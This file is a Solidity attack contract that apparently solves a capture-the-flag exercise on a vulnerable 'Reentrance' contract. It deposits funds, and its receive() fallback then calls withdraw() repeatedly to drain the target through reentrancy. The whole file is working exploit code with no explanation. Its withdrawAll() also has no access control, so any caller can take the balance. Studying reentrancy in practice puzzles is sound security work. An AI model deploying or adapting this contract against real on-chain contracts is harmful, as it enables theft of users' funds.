// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./origin.sol";

contract attacker {

Reentrance reContract;

constructor (address payable _reAddress) public {
    reContract = Reentrance(_reAddress);
}

function donate() public payable {
    reContract.donate{value: msg.value}(address(this));
}

function attack(uint _amount) public {
    reContract.withdraw(_amount);
}

function withdrawAll() public payable {
   (bool sent, ) = msg.sender.call{value: address(this).balance}("");
   require(sent);
}

receive() external payable {
    attack(msg.value);
}

}